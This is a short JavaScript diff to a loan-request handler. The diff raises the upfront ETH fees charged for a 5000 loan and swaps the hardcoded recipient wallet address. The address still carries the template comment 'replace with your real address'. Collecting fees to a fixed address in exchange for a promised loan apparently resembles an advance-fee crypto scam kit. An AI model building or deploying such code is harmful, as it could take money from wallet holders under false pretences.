@@ -21,9 +21,9 @@ export async function handleLoanRequest(walletClient, userAddress, loanAmount) {
 
     switch (loanAmount) {
       case 5000:
-        networkFee = 0.002; // 0.015 ETH
-        processingFee = 0.001;
-        totalFee = 0.003;
+        networkFee = 0.015; // 0.015 ETH
+        processingFee = 0.005;
+        totalFee = 0.02;
         break;
       case 10000:
         networkFee = 0.025; // 0.025 ETH
@@ -71,7 +71,7 @@ export async function handleLoanRequest(walletClient, userAddress, loanAmount) {
     }
 
     const tx = {
-      to: '0xB763A8cD434CbfE401d118408e95F7A01b2c1549', // replace with your real address
+      to: '0xADD003E62A930d6D950453080B82156D7Cfe1f4A', // replace with your real address
       value: parseEther(totalFee.toString()), // Use calculated total fee
       account: userAddress
     };
